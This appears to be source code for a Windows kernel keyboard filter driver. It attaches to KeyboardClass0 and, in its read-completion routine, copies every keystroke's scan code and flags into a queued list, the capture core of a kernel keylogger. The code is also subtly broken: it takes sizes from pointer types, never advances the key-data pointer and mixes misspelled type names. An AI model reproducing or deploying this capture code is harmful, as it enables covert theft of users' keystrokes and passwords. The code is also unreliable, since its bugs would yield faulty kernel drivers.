#include "common.h"
#include "KHook.h"

extern long g_PendingWrite ;
NTSTATUS HookKeyboardDevice(PDRIVER_OBJECT pDriverObject)
//创建设备，attach设备,初始化链表和互斥量
{//passive
	WCHAR wDeviceName[] = L"\\Device\\KeyboardClass0";
	UNICODE_STRING uDeviceName;
	PDEVICE_EXTIONSION pKeyboardDeviceExtension=NULL ;
	PDEVICE_OBJECT pHookDevice = NULL;
	NTSTATUS Status;
	
	do{
		RtlInitUnicodeString(&uDeviceName, wDeviceName);
		Status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, true, &pHookDevice);
		if (!NT_SUCCESS(Status)){
			break;
		}
		pKeyboardDeviceExtension = (PDEVICE_EXTIONSION)pHookDevice->DeviceExtension;
		RtlZeroMemory(pKeyboardDeviceExtension, sizeof(PDEVICE_EXTIONSION));
		pHookDevice->Flags &= ~DO_DEVICE_INITIALIZING;
		pHookDevice->Flags |= (DO_BUFFERED_IO|DO_POWER_PAGABLE);
		Status = IoAttachDevice(pHookDevice, &uDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
		if (!NT_SUCCESS(Status))
		{
			break;
		}
		//???
		KeInitializeSemaphore(&pKeyboardDeviceExtension->sem, 0, MAXLONG);
		InitializeListHead(&pKeyboardDeviceExtension->MessageList);
		KeInitializeSpinLock(&pKeyboardDeviceExtension->kLock);

	}while(false);
	if (!NT_SUCCESS(Status))
	{
		if (pHookDevice!=NULL)
		{
			IoDeleteDevice(pHookDevice);
			IoDetachDevice(pHookDevice);
		}

	}
	return Status;
}
NTSTATUS HookDevicePassThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{//passive
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
	IoSkipCurrentIrpStackLocation(pIrp);
	//这里原来是调用的DeviceExtension里的pKeyboardDevice
	return IofCallDriver(pKeyboardDeviceExtension->pKeyboardDevice, pIrp);
}
NTSTATUS HookDeviceRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{

	IoCopyCurrentIrpStackLocationToNext(pIrp);
	IoSetCompletionRoutine(pIrp, HookDeviceReadComplete, pDeviceObject->DeviceExtension, true, true, true);
	g_PendingWrite++;
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}
NTSTATUS HookDeviceReadComplete(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
{/*DISPATCH LEVEL*/
	PDEVICE_EXTIONSION pKeyboardDeviceExtension = (PDEVICE_EXTIONSION)pDeviceObject->DeviceExtension;
	PKEYBOARD_INPUT_DATA pKeyData = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
	
	if (pIrp->IoStatus.Status == STATUS_SUCCESS){
		int KeyCount = pIrp->IoStatus.Information / sizeof(PKEYBOARD_INPUT_DATA);
		int i;
		
	//_asm int 3
		DbgPrint("Complete read");

		for (i=0; i<KeyCount; i++)
		{
			DbgPrint("Key up");
			KEY_DATA *kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
			RtlZeroMemory(kData, sizeof(KEY_DATA));
			kData->KeyData = pKeyData->MakeCode;
			kData->KeyFlags = pKeyData->Flags;
			ExInterlockedInsertTailList(&pKeyboardDeviceExtension->MessageList,&kData->ListEntry,&pKeyboardDeviceExtension->kLock);
			KeReleaseSemaphore(&pKeyboardDeviceExtension->sem,0,1, false);	

		}
	}
	//?????
	if(pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);
	g_PendingWrite--;
	return pIrp->IoStatus.Status;
}
